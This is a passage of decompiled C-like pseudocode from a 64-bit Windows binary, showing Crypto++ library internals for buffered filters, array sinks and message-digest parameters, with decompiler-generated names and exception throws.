//----- (000000013F129520) ----------------------------------------------------
__int64 __fastcall sub_13F129520(_QWORD *a1, _QWORD *a2)
{
  __int64 v2; // rax

  v2 = a1[4] - a1[5];
  if ( a1[4] <= a1[5] )
    v2 = 0i64;
  *a2 = v2;
  return a1[5] + a1[3];
}

//----- (000000013F129550) ----------------------------------------------------
__int64 __fastcall sub_13F129550(__int64 a1, __int64 a2)
{
  __int64 v3; // rax

  v3 = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 24) + 336i64))(*(_QWORD *)(a1 + 24));
  return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v3 + 32i64))(v3, a2);
}

//----- (000000013F129580) ----------------------------------------------------
__int64 __fastcall sub_13F129580(__int64 a1, __int64 a2)
{
  __int64 (__fastcall ***v4)(_QWORD, __int64); // rcx
  __int64 result; // rax

  v4 = *(__int64 (__fastcall ****)(_QWORD, __int64))(a1 + 24);
  if ( v4 )
    result = (**v4)(v4, 1i64);
  *(_QWORD *)(a1 + 24) = a2;
  return result;
}

//----- (000000013F1295C0) ----------------------------------------------------
char __fastcall sub_13F1295C0(_DWORD *a1, unsigned __int8 a2, int a3, unsigned __int8 a4)
{
  int v6; // ecx
  char result; // al
  __int64 v10; // rax
  int v11; // ecx
  unsigned __int8 v12; // [rsp+20h] [rbp-18h]

  v6 = a1[10];
  if ( v6 )
  {
    if ( v6 != 1 )
      return 0;
  }
  else if ( (*(unsigned __int8 (__fastcall **)(_DWORD *, _QWORD, _QWORD))(*(_QWORD *)a1 + 72i64))(a1, a2, a4) )
  {
    return 1;
  }
  if ( a3
    && (v10 = (*(__int64 (__fastcall **)(_DWORD *))(*(_QWORD *)a1 + 336i64))(a1),
        v12 = a4,
        (*(unsigned __int8 (__fastcall **)(__int64, __int64 *, _QWORD, _QWORD, unsigned __int8))(*(_QWORD *)v10 + 296i64))(
          v10,
          &qword_13F1B7008,
          a2,
          (unsigned int)(a3 - 1),
          v12)) )
  {
    result = 1;
    v11 = 1;
  }
  else
  {
    result = 0;
    v11 = 0;
  }
  a1[10] = v11;
  if ( result )
    return 1;
  return result;
}
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F129670) ----------------------------------------------------
char __fastcall sub_13F129670(__int64 a1, unsigned __int8 a2, unsigned int a3, unsigned __int8 a4)
{
  __int64 v7; // rax

  if ( !*(_BYTE *)(a1 + 32) )
    return 0;
  v7 = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 24) + 336i64))(*(_QWORD *)(a1 + 24));
  return (*(__int64 (__fastcall **)(__int64, _QWORD, _QWORD, _QWORD))(*(_QWORD *)v7 + 96i64))(v7, a2, a3, a4);
}

//----- (000000013F1296E0) ----------------------------------------------------
void __fastcall sub_13F1296E0(unsigned __int64 *a1)
{
  unsigned __int64 v2; // rax
  unsigned __int64 *v3; // rdi
  unsigned __int64 v4; // r9
  unsigned __int64 v5; // r10
  unsigned __int64 v6; // r11
  unsigned __int64 v7; // r8
  unsigned __int64 v8; // r8
  unsigned __int64 v9; // r10
  unsigned __int64 *v10; // rax
  bool v11; // zf
  unsigned __int64 v12; // [rsp+30h] [rbp+8h] BYREF

  if ( *((_BYTE *)a1 + 72) )
  {
    v2 = a1[7];
    v3 = a1 + 16;
    v4 = a1[16];
    if ( v2 <= 1 )
    {
      if ( v4 )
      {
        v8 = a1[16];
        do
        {
          v9 = a1[17];
          v10 = &v12;
          v12 = a1[12] + a1[13] - v9;
          if ( v8 < v12 )
            v10 = v3;
          if ( *v10 < v4 )
            v4 = *v10;
          v11 = *v3 == v4;
          *v3 -= v4;
          a1[17] = v4 + v9;
          if ( v11 || v4 + v9 == a1[12] + a1[13] )
            a1[17] = a1[13];
          (*(void (__fastcall **)(unsigned __int64 *, unsigned __int64, unsigned __int64))(*a1 + 456))(a1, v9, v4);
          v8 = *v3;
          v4 = *v3;
        }
        while ( *v3 );
      }
    }
    else if ( v4 >= v2 )
    {
      do
      {
        v5 = a1[14];
        if ( v4 < v5 )
        {
          v6 = 0i64;
        }
        else
        {
          v6 = a1[17];
          v7 = v6 + v5;
          a1[17] = v6 + v5;
          if ( v6 + v5 == a1[13] + a1[12] )
            v7 = a1[13];
          *v3 = v4 - v5;
          a1[17] = v7;
        }
        (*(void (__fastcall **)(unsigned __int64 *, unsigned __int64, unsigned __int64))(*a1 + 456))(a1, v6, a1[7]);
        v4 = *v3;
      }
      while ( *v3 >= a1[7] );
    }
  }
}

//----- (000000013F129810) ----------------------------------------------------
__int64 __fastcall sub_13F129810(_QWORD *a1, unsigned __int64 *a2)
{
  _QWORD *v2; // r8
  unsigned __int64 *v3; // rax
  unsigned __int64 v5; // rdx
  __int64 v6; // r9
  bool v7; // zf
  __int64 v9; // [rsp+8h] [rbp+8h] BYREF

  v2 = a1 + 6;
  v3 = (unsigned __int64 *)&v9;
  v5 = *a2;
  if ( a1[6] < a1[2] + a1[3] - a1[7] )
    v3 = a1 + 6;
  v9 = a1[2] + a1[3] - a1[7];
  if ( *v3 < v5 )
    v5 = *v3;
  *a2 = v5;
  v6 = a1[7];
  a1[7] = v5 + v6;
  v7 = *v2 == *a2;
  *v2 -= *a2;
  if ( v7 || v5 + v6 == a1[2] + a1[3] )
    a1[7] = a1[3];
  return v6;
}

//----- (000000013F129880) ----------------------------------------------------
char __fastcall sub_13F129880(_BYTE *a1)
{
  if ( a1[32] || (*(unsigned __int8 (__fastcall **)(_BYTE *))(*(_QWORD *)a1 + 136i64))(a1) )
    return 0;
  a1[32] = 1;
  return 1;
}

//----- (000000013F1298B0) ----------------------------------------------------
__int64 __fastcall sub_13F1298B0(__int64 a1, __int64 a2, int a3)
{
  __int64 result; // rax
  __int64 v7; // rax

  *(_DWORD *)(a1 + 40) = 0;
  *(_QWORD *)(a1 + 32) = 0i64;
  result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 64i64))(a1);
  if ( a3 )
  {
    v7 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 336i64))(a1);
    return (*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)v7 + 88i64))(v7, a2, (unsigned int)(a3 - 1));
  }
  return result;
}

//----- (000000013F129910) ----------------------------------------------------
void __fastcall sub_13F129910(__int64 a1, __int64 a2, unsigned int a3)
{
  __int64 v5; // rax

  if ( *(_BYTE *)(a1 + 32) )
  {
    v5 = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 24) + 336i64))(*(_QWORD *)(a1 + 24));
    (*(void (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)v5 + 88i64))(v5, a2, a3);
  }
}

//----- (000000013F129950) ----------------------------------------------------
char __fastcall sub_13F129950(unsigned __int64 *a1, char a2, char a3)
{
  __m128i v5[2]; // [rsp+28h] [rbp-80h] BYREF
  char pExceptionObject[64]; // [rsp+50h] [rbp-58h] BYREF

  if ( !a3 )
  {
    sub_13F1053B0(v5, (const __m128i *)"FilterWithBufferedInput");
    sub_13F128CB0((__int64)pExceptionObject, v5);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AUBlockingInputOnly_BufferedTransformation_CryptoPP__);
  }
  if ( a2 )
    sub_13F1296E0(a1);
  (*(void (__fastcall **)(unsigned __int64 *))(*a1 + 472))(a1);
  return 0;
}
// 13F129950: using guessed type __m128i var_80[2];

//----- (000000013F1299E0) ----------------------------------------------------
char __fastcall sub_13F1299E0(__int64 a1, __int64 a2, unsigned __int8 a3)
{
  __int64 v3; // rcx

  v3 = *(_QWORD *)(a1 + 144);
  if ( v3 )
    return (*(__int64 (__fastcall **)(__int64, __int64, __int64, _QWORD))(*(_QWORD *)v3 + 96i64))(
             v3,
             a2,
             0xFFFFFFFFi64,
             a3);
  else
    return 0;
}

//----- (000000013F129A00) ----------------------------------------------------
__int64 __fastcall sub_13F129A00(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  __int64 v4; // [rsp+20h] [rbp-98h] BYREF
  __int64 v5; // [rsp+28h] [rbp-90h]
  __int64 v6; // [rsp+30h] [rbp-88h]
  __m128i v7[2]; // [rsp+38h] [rbp-80h] BYREF
  char pExceptionObject[64]; // [rsp+60h] [rbp-58h] BYREF

  v6 = -2i64;
  v4 = 0i64;
  v5 = 0i64;
  if ( !(*(unsigned __int8 (__fastcall **)(__int64, const char *, void *, __int64 *))(*(_QWORD *)a2 + 8i64))(
          a2,
          "OutputBuffer",
          &CryptoPP::ByteArrayParameter `RTTI Type Descriptor',
          &v4) )
  {
    sub_13F1053B0(v7, (const __m128i *)"ArraySink: missing OutputBuffer argument");
    sub_13F101600((__int64)pExceptionObject, v7);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  *(_QWORD *)(a1 + 24) = v4;
  result = v5;
  *(_QWORD *)(a1 + 32) = v5;
  return result;
}
// 13F129A00: using guessed type __m128i var_80[2];

//----- (000000013F129AC0) ----------------------------------------------------
__int64 __fastcall sub_13F129AC0(__int64 a1, __int64 a2)
{
  _QWORD *v3; // rsi
  __int64 v4; // r8
  __int64 result; // rax
  __m128i v6[2]; // [rsp+38h] [rbp-90h] BYREF
  char pExceptionObject[64]; // [rsp+60h] [rbp-68h] BYREF

  v3 = (_QWORD *)(a1 + 64);
  (*(void (__fastcall **)(__int64, __int64, __int64, __int64, __int64))(*(_QWORD *)a1 + 416i64))(
    a1,
    a2,
    a1 + 48,
    a1 + 56,
    a1 + 64);
  v4 = *(_QWORD *)(a1 + 48);
  if ( v4 == -1 || !*(_QWORD *)(a1 + 56) || *v3 == -1i64 )
  {
    sub_13F1053B0(v6, (const __m128i *)"FilterWithBufferedInput: invalid buffer size");
    sub_13F101600((__int64)pExceptionObject, v6);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  result = sub_13F12A810((_QWORD *)(a1 + 80), 1i64, v4);
  *(_BYTE *)(a1 + 72) = 0;
  return result;
}
// 13F129AC0: using guessed type __m128i var_90[2];

//----- (000000013F129B90) ----------------------------------------------------
__int64 __fastcall sub_13F129B90(__int64 a1, __int64 a2)
{
  char v4; // al
  char v5; // r9
  __int64 result; // rax
  unsigned int v7; // [rsp+30h] [rbp+8h] BYREF

  v4 = (*(__int64 (__fastcall **)(__int64, const char *, bool *, unsigned int *))(*(_QWORD *)a2 + 8i64))(
         a2,
         "PutMessage",
         &bool `RTTI Type Descriptor',
         &v7);
  v5 = 0;
  if ( v4 )
    v5 = v7;
  *(_BYTE *)(a1 + 96) = v5;
  if ( !(*(unsigned __int8 (__fastcall **)(__int64, const char *, int *, unsigned int *))(*(_QWORD *)a2 + 8i64))(
          a2,
          "TruncatedDigestSize",
          &int `RTTI Type Descriptor',
          &v7)
    || (result = v7, (v7 & 0x80000000) != 0) )
  {
    result = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 88) + 64i64))(*(_QWORD *)(a1 + 88));
  }
  *(_DWORD *)(a1 + 100) = result;
  return result;
}
// 13F1C3820: using guessed type bool bool `RTTI Type Descriptor';
// 13F1C3E48: using guessed type int int `RTTI Type Descriptor';

//----- (000000013F129C10) ----------------------------------------------------
bool __fastcall sub_13F129C10(_DWORD *a1, int a2, unsigned __int8 a3)
{
  int v5; // ecx
  __int64 v8; // rax
  char v9; // al
  int v10; // ecx

  v5 = a1[10];
  if ( v5 )
  {
    if ( v5 != 1 )
      return 0;
  }
  else if ( (*(unsigned __int8 (__fastcall **)(_DWORD *, _QWORD))(*(_QWORD *)a1 + 80i64))(a1, a3) )
  {
    return 1;
  }
  if ( !(*(unsigned __int8 (__fastcall **)(_DWORD *))(*(_QWORD *)a1 + 376i64))(a1) )
    return 0;
  if ( a2
    && (v8 = (*(__int64 (__fastcall **)(_DWORD *))(*(_QWORD *)a1 + 336i64))(a1),
        (*(unsigned __int8 (__fastcall **)(__int64, __int64 *, _QWORD, _QWORD))(*(_QWORD *)v8 + 304i64))(
          v8,
          &qword_13F1B7008,
          (unsigned int)(a2 - 1),
          a3)) )
  {
    v9 = 1;
    v10 = 1;
  }
  else
  {
    v9 = 0;
    v10 = 0;
  }
  a1[10] = v10;
  return v9 != 0;
}
// 13F1B7008: using guessed type __int64 qword_13F1B7008;

//----- (000000013F129CD0) ----------------------------------------------------
char __fastcall sub_13F129CD0(__int64 a1, unsigned int a2, unsigned __int8 a3)
{
  __int64 v5; // rax

  if ( !*(_BYTE *)(a1 + 32) )
    return 0;
  v5 = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 24) + 336i64))(*(_QWORD *)(a1 + 24));
  return (*(__int64 (__fastcall **)(__int64, _QWORD, _QWORD))(*(_QWORD *)v5 + 104i64))(v5, a2, a3);
}

//----- (000000013F129D20) ----------------------------------------------------
__int64 sub_13F129D20()
{
  __int64 v0; // rax

  v0 = sub_13F14059C(192i64);
  if ( v0 )
    return sub_13F13C4C0(v0, 0x100u);
  else
    return 0i64;
}
// 13F129D20: using guessed type __int64 __fastcall sub_13F129D20();

//----- (000000013F129D60) ----------------------------------------------------
__int64 __fastcall sub_13F129D60(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rcx
  __int64 result; // rax
  char v5; // [rsp+20h] [rbp-18h]

  v3 = *(_QWORD *)(a1 + 144);
  if ( v3 )
  {
    v5 = 1;
    return (*(__int64 (__fastcall **)(__int64, __int64, __int64, _QWORD, char))(*(_QWORD *)v3 + 56i64))(
             v3,
             a2,
             a3,
             0i64,
             v5);
  }
  return result;
}

//----- (000000013F129D90) ----------------------------------------------------
__int64 __fastcall sub_13F129D90(_QWORD *a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rsi
  __int64 result; // rax

  if ( a3 )
  {
    v3 = a3;
    do
    {
      result = (*(__int64 (__fastcall **)(_QWORD *, __int64))(*a1 + 440i64))(a1, a2);
      a2 += a1[7];
      v3 -= a1[7];
    }
    while ( v3 );
  }
  return result;
}

//----- (000000013F129DE0) ----------------------------------------------------
__int64 __fastcall sub_13F129DE0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rcx
  __int64 result; // rax
  char v5; // [rsp+20h] [rbp-18h]

  v3 = *(_QWORD *)(a1 + 144);
  if ( v3 )
  {
    v5 = 1;
    return (*(__int64 (__fastcall **)(__int64, __int64, __int64, _QWORD, char))(*(_QWORD *)v3 + 48i64))(
             v3,
             a2,
             a3,
             0i64,
             v5);
  }
  return result;
}

//----- (000000013F129E10) ----------------------------------------------------
__int64 __fastcall sub_13F129E10(_DWORD *a1, int a2, __int64 a3, __int64 a4, int a5, char a6, __int64 a7)
{
  __int64 v11; // rax
  int v12; // er11
  __int64 result; // rax
  int v14; // ecx

  v11 = (*(__int64 (__fastcall **)(_DWORD *))(*(_QWORD *)a1 + 336i64))(a1);
  v12 = a5 - 1;
  if ( !a5 )
    v12 = 0;
  result = (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64, int, char))(*(_QWORD *)v11 + 280i64))(
             v11,
             a7,
             a3,
             a4,
             v12,
             a6);
  v14 = 0;
  if ( result )
    v14 = a2;
  a1[10] = v14;
  return result;
}

//----- (000000013F129EA0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F129EA0(_QWORD *a1, const __m128i *a2, unsigned __int64 a3)
{
  unsigned __int64 v4; // rsi
  __int64 v5; // r8
  unsigned __int64 v7; // r9
  unsigned __int64 v8; // rcx

  v4 = 0i64;
  v5 = a1[3];
  if ( v5 && a2 )
  {
    v7 = a1[5];
    v8 = a1[4] - v7;
    if ( a1[4] <= v7 )
      v8 = 0i64;
    v4 = a3;
    if ( v8 < a3 )
      v4 = v8;
    sub_13F15EB00((__m128i *)(v7 + v5), a2, v4);
  }
  a1[5] += v4;
  return a3 - v4;
}

//----- (000000013F129F10) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F129F10(_QWORD *a1, unsigned __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v4; // rsi
  __int64 v5; // r8
  unsigned __int64 v7; // r9
  unsigned __int64 v8; // rcx

  v4 = 0i64;
  v5 = a1[3];
  if ( v5 && a2 )
  {
    v7 = a1[5];
    v8 = a1[4] - v7;
    if ( a1[4] <= v7 )
      v8 = 0i64;
    v4 = a3;
    if ( v8 < a3 )
      v4 = v8;
    sub_13F133F90(v7 + v5, a2, v4);
  }
  a1[5] += v4;
  return a3 - v4;
}

//----- (000000013F129F80) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F129F80(__int64 *a1, __int64 a2, __int64 a3, int a4, char a5)
{
  char v5; // r15
  int v7; // ecx
  int v8; // ebp
  int v12; // ecx
  unsigned __int64 result; // rax
  __int64 v14; // rax
  __int64 v15; // rax
  unsigned __int64 v16; // rdi
  unsigned __int64 v17; // rdi
  __int64 v18; // rax
  __int64 v19; // rax
  __int64 v20; // rdx
  __int64 v21; // rcx
  __int64 v22; // r8
  unsigned __int64 v23; // [rsp+60h] [rbp+8h] BYREF

  v5 = a5;
  v7 = *((_DWORD *)a1 + 10);
  v8 = 0;
  if ( v7 )
  {
    v12 = v7 - 1;
    if ( v12 )
    {
      if ( v12 != 1 )
        return 0i64;
      goto LABEL_19;
    }
  }
  else
  {
    a1[4] = 0i64;
    if ( !*((_BYTE *)a1 + 96) )
      goto LABEL_10;
  }
  v14 = (*(__int64 (__fastcall **)(__int64 *))(*a1 + 336))(a1);
  v15 = (*(__int64 (__fastcall **)(__int64, __int64 *, __int64, __int64, _DWORD, char))(*(_QWORD *)v14 + 280i64))(
          v14,
          a1 + 14,
          a2,
          a3,
          0,
          v5);
  LOBYTE(v8) = v15 != 0;
  *((_DWORD *)a1 + 10) = v8;
  if ( v15 )
  {
    v16 = a3 - a1[4];
    result = 1i64;
    if ( v16 > 1 )
      return v16;
    return result;
  }
LABEL_10:
  if ( a2 && a3 )
    (*(void (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)a1[11] + 32i64))(a1[11], a2, a3);
  if ( !a4 )
    return 0i64;
  v17 = *((unsigned int *)a1 + 25);
  v18 = *a1;
  v23 = v17;
  v19 = (*(__int64 (__fastcall **)(__int64 *))(v18 + 336))(a1);
  if ( a1[9] >= v17 )
    goto LABEL_17;
  v20 = (*(__int64 (__fastcall **)(__int64, __int64 *, unsigned __int64 *))(*(_QWORD *)v19 + 272i64))(
          v19,
          a1 + 18,
          &v23);
  if ( v23 < v17 )
  {
    sub_13F1051C0(a1 + 7, (unsigned int)v17);
LABEL_17:
    v20 = a1[10];
  }
  v21 = a1[11];
  v22 = *((unsigned int *)a1 + 25);
  a1[13] = v20;
  (*(void (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v21 + 120i64))(v21, v20, v22);
LABEL_19:
  if ( !sub_13F129E10(a1, 2, a1[13], *((unsigned int *)a1 + 25), a4, v5, (__int64)(a1 + 18)) )
    return 0i64;
  result = 1i64;
  if ( (unsigned __int64)*((unsigned int *)a1 + 25) - a1[4] > 1 )
    return *((unsigned int *)a1 + 25) - a1[4];
  return result;
}

//----- (000000013F12A110) ----------------------------------------------------
__int64 __fastcall sub_13F12A110(__int64 a1, __int64 a2, __int64 a3, unsigned int a4, char a5)
{
  __int64 v9; // rax
  __int64 v10; // r9

  v9 = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 24) + 336i64))(*(_QWORD *)(a1 + 24));
  v10 = 0i64;
  if ( *(_BYTE *)(a1 + 32) )
    v10 = a4;
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)v9 + 48i64))(v9, a2, a3, v10);
}

//----- (000000013F12A180) ----------------------------------------------------
__m128i *__fastcall sub_13F12A180(__int64 a1, const __m128i *a2, unsigned __int64 a3)
{
  __int64 v6; // r10
  __int64 v7; // r11
  __int64 v8; // r9
  unsigned __int64 v9; // r14
  __int64 v10; // rcx
  __m128i *v11; // rcx
  __int64 v12; // r10
  __m128i *result; // rax

  if ( a2 && a3 )
  {
    v6 = *(_QWORD *)(a1 + 16);
    v7 = *(_QWORD *)(a1 + 24);
    v8 = *(_QWORD *)(a1 + 56);
    v9 = a3;
    v10 = v8 - v6;
    if ( *(_QWORD *)(a1 + 48) < (unsigned __int64)(v7 + v6 - v8) )
      v10 = v8;
    v11 = (__m128i *)(*(_QWORD *)(a1 + 48) + v10);
    v12 = v6 - (_QWORD)v11;
    if ( v12 + v7 < a3 )
      v9 = v12 + v7;
    result = sub_13F15EB00(v11, a2, v9);
    if ( v9 < a3 )
      result = sub_13F15EB00(*(__m128i **)(a1 + 24), (const __m128i *)((char *)a2 + v9), a3 - v9);
    *(_QWORD *)(a1 + 48) += a3;
  }
  return result;
}

//----- (000000013F12A220) ----------------------------------------------------
__int64 __fastcall sub_13F12A220(_DWORD *a1, const __m128i *a2, __int64 a3, int a4, char a5, char a6)
{
  const __m128i *v7; // r14
  char v9; // r13
  int v10; // er15
  __int64 v11; // rax
  unsigned __int64 v12; // rbp
  unsigned __int64 *v13; // r13
  unsigned __int64 v14; // r12
  unsigned __int64 v15; // r12
  __int64 v16; // rbx
  __int64 v17; // rdx
  unsigned __int64 v18; // rbx
  unsigned __int64 v19; // rax
  unsigned __int64 v20; // r10
  unsigned __int64 v21; // rbx
  unsigned __int64 v22; // r9
  __int64 v23; // r11
  _QWORD *v24; // r8
  unsigned __int64 *v25; // rcx
  __int64 *v26; // rax
  __int64 v27; // rbx
  __int64 v28; // rcx
  bool v29; // zf
  unsigned __int64 v30; // rbp
  __int64 v31; // rax
  __int64 v32; // rcx
  unsigned __int64 v33; // r8
  unsigned __int64 v34; // r9
  unsigned __int64 v35; // r10
  __int64 v36; // r11
  __int64 v37; // r8
  unsigned __int64 v38; // r8
  __int64 v39; // rax
  unsigned __int64 v40; // rbx
  unsigned __int64 v41; // r9
  unsigned __int64 v42; // r11
  __int64 v43; // r10
  __int64 v44; // r8
  unsigned __int64 v45; // rbx
  unsigned __int64 v46; // rax
  __int64 v47; // rbx
  __int64 v48; // rax
  _DWORD *v49; // rbx
  __int64 v50; // r14
  __m128i *v51; // rbp
  unsigned __int64 v52; // r8
  const __m128i *v53; // r9
  unsigned __int64 *v54; // rsi
  __int64 *v55; // rcx
  unsigned __int64 *v56; // rax
  unsigned __int64 v57; // r12
  char *v58; // r8
  __int64 v59; // rdx
  __int64 v60; // rbx
  __int64 v61; // rax
  unsigned __int64 v64; // [rsp+38h] [rbp-D0h] BYREF
  __int64 v65[2]; // [rsp+40h] [rbp-C8h] BYREF
  __m128i v66; // [rsp+50h] [rbp-B8h] BYREF
  __int64 v67; // [rsp+60h] [rbp-A8h]
  __m128i *v68; // [rsp+68h] [rbp-A0h]
  char pExceptionObject[64]; // [rsp+70h] [rbp-98h] BYREF

  v65[1] = -2i64;
  v7 = a2;
  v9 = a5;
  if ( !a5 )
  {
    sub_13F1053B0(&v66, (const __m128i *)"FilterWithBufferedInput");
    sub_13F128CB0((__int64)pExceptionObject, &v66);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AUBlockingInputOnly_BufferedTransformation_CryptoPP__);
  }
  v10 = 0;
  if ( a3 )
  {
    v11 = *((_QWORD *)a1 + 16);
    v12 = a3 + v11;
    if ( !*((_BYTE *)a1 + 72) )
    {
      v13 = (unsigned __int64 *)(a1 + 12);
      v14 = *((_QWORD *)a1 + 6);
      if ( v12 < v14 )
      {
LABEL_51:
        v49 = a1 + 20;
        sub_13F12A180((__int64)(a1 + 20), v7, v12 - *((_QWORD *)a1 + 16));
        v9 = a5;
        goto LABEL_53;
      }
      v15 = v14 - v11;
      sub_13F12A180((__int64)(a1 + 20), a2, v15);
      v16 = *(_QWORD *)a1;
      v17 = sub_13F129810((_QWORD *)a1 + 10, v13);
      (*(void (__fastcall **)(_DWORD *, __int64))(v16 + 432))(a1, v17);
      sub_13F12A810(
        (_QWORD *)a1 + 10,
        *((_QWORD *)a1 + 7),
        (unsigned __int64)(*((_QWORD *)a1 + 8) + 2i64 * *((_QWORD *)a1 + 7) - 2) / *((_QWORD *)a1 + 7));
      v7 = (const __m128i *)((char *)v7 + v15);
      v12 -= *v13;
      *((_BYTE *)a1 + 72) = 1;
    }
    v18 = *((_QWORD *)a1 + 7);
    if ( v18 == 1 )
    {
      if ( v12 > *((_QWORD *)a1 + 8) )
      {
        v19 = *((_QWORD *)a1 + 8);
        do
        {
          v20 = *((_QWORD *)a1 + 16);
          v21 = v19;
          if ( !v20 )
            break;
          v22 = v12 - v19;
          v65[0] = v12 - v19;
          v23 = *((_QWORD *)a1 + 17);
          v64 = *((_QWORD *)a1 + 12) + *((_QWORD *)a1 + 13) - v23;
          v24 = a1 + 32;
          v25 = &v64;
          if ( v20 < v64 )
            v25 = (unsigned __int64 *)(a1 + 32);
          v26 = v65;
          if ( *v25 < v22 )
            v26 = (__int64 *)v25;
          v27 = *v26;
          v28 = v23 + *v26;
          *((_QWORD *)a1 + 17) = v28;
          v29 = *v24 == v27;
          *v24 -= v27;
          if ( v29 || v28 == *((_QWORD *)a1 + 12) + *((_QWORD *)a1 + 13) )
            *((_QWORD *)a1 + 17) = *((_QWORD *)a1 + 13);
          (*(void (__fastcall **)(_DWORD *, __int64, __int64))(*(_QWORD *)a1 + 456i64))(a1, v23, v27);
          v12 -= v27;
          v21 = *((_QWORD *)a1 + 8);
          v19 = v21;
        }
        while ( v12 > v21 );
        if ( v12 > v21 )
        {
          v30 = v12 - v21;
          v31 = *(_QWORD *)a1;
          if ( a6 )
            (*(void (__fastcall **)(_DWORD *, const __m128i *, unsigned __int64))(v31 + 456))(a1, v7, v30);
          else
            (*(void (__fastcall **)(_DWORD *, const __m128i *, unsigned __int64))(v31 + 448))(a1, v7, v30);
          v7 = (const __m128i *)((char *)v7 + v30);
          v12 = v21;
        }
      }
    }
    else
    {
      v32 = *((_QWORD *)a1 + 8);
      if ( v12 >= v32 + v18 )
      {
        v33 = *((_QWORD *)a1 + 7);
        do
        {
          v34 = *((_QWORD *)a1 + 16);
          v18 = v33;
          if ( v34 < v33 )
            break;
          v35 = *((_QWORD *)a1 + 14);
          if ( v34 < v35 )
          {
            v36 = 0i64;
          }
          else
          {
            v36 = *((_QWORD *)a1 + 17);
            v37 = v36 + v35;
            *((_QWORD *)a1 + 17) = v36 + v35;
            if ( v36 + v35 == *((_QWORD *)a1 + 13) + *((_QWORD *)a1 + 12) )
              v37 = *((_QWORD *)a1 + 13);
            *((_QWORD *)a1 + 17) = v37;
            *((_QWORD *)a1 + 16) = v34 - v35;
            v33 = *((_QWORD *)a1 + 7);
          }
          (*(void (__fastcall **)(_DWORD *, __int64, unsigned __int64))(*(_QWORD *)a1 + 456i64))(a1, v36, v33);
          v18 = *((_QWORD *)a1 + 7);
          v12 -= v18;
          v32 = *((_QWORD *)a1 + 8);
          v33 = v18;
        }
        while ( v12 >= v32 + v18 );
      }
      v38 = v18;
      if ( v12 >= v32 + v18 )
      {
        v39 = *((_QWORD *)a1 + 16);
        if ( v39 )
        {
          v40 = v18 - v39;
          sub_13F12A180((__int64)(a1 + 20), v7, v40);
          v7 = (const __m128i *)((char *)v7 + v40);
          v41 = *((_QWORD *)a1 + 16);
          v42 = *((_QWORD *)a1 + 14);
          if ( v41 < v42 )
          {
            v43 = 0i64;
          }
          else
          {
            v43 = *((_QWORD *)a1 + 17);
            v44 = v43 + v42;
            *((_QWORD *)a1 + 17) = v43 + v42;
            if ( v43 + v42 == *((_QWORD *)a1 + 13) + *((_QWORD *)a1 + 12) )
              v44 = *((_QWORD *)a1 + 13);
            *((_QWORD *)a1 + 17) = v44;
            *((_QWORD *)a1 + 16) = v41 - v42;
          }
          (*(void (__fastcall **)(_DWORD *, __int64, _QWORD))(*(_QWORD *)a1 + 456i64))(a1, v43, *((_QWORD *)a1 + 7));
          v38 = *((_QWORD *)a1 + 7);
          v12 -= v38;
          v32 = *((_QWORD *)a1 + 8);
        }
      }
      if ( v12 >= v32 + v38 )
      {
        v45 = v12 - v32;
        if ( !v38 || ((v38 - 1) & v38) != 0 )
        {
          v47 = v45 - v45 % v38;
        }
        else
        {
          v46 = v38 - 1;
          if ( v38 <= 1 )
            v46 = 0i64;
          v47 = v45 - (v45 & v46);
        }
        v48 = *(_QWORD *)a1;
        if ( a6 )
          (*(void (__fastcall **)(_DWORD *, const __m128i *, __int64))(v48 + 456))(a1, v7, v47);
        else
          (*(void (__fastcall **)(_DWORD *, const __m128i *, __int64))(v48 + 448))(a1, v7, v47);
        v7 = (const __m128i *)((char *)v7 + v47);
        v12 -= v47;
      }
    }
    goto LABEL_51;
  }
  v49 = a1 + 20;
LABEL_53:
  if ( a4 )
  {
    if ( !*((_BYTE *)a1 + 72) && !*((_QWORD *)a1 + 6) )
      (*(void (__fastcall **)(_DWORD *, _QWORD))(*(_QWORD *)a1 + 432i64))(a1, 0i64);
    v50 = *((_QWORD *)a1 + 16);
    v66.m128i_i64[1] = -1i64;
    v67 = v50;
    if ( v50 )
      v51 = (__m128i *)sub_13F12E4E0(v50);
    else
      v51 = 0i64;
    v68 = v51;
    if ( v51 )
    {
      v52 = *((_QWORD *)v49 + 4) * *((_QWORD *)v49 + 5);
      v64 = v52;
      v53 = (const __m128i *)*((_QWORD *)v49 + 7);
      v65[0] = *((_QWORD *)v49 + 2) + *((_QWORD *)v49 + 3) - (_QWORD)v53;
      v54 = (unsigned __int64 *)(v49 + 12);
      v55 = v65;
      if ( *((_QWORD *)v49 + 6) < v65[0] )
        v55 = (__int64 *)(v49 + 12);
      v56 = &v64;
      if ( *v55 < v52 )
        v56 = (unsigned __int64 *)v55;
      v57 = *v56;
      v58 = &v53->m128i_i8[*v56];
      *((_QWORD *)v49 + 7) = v58;
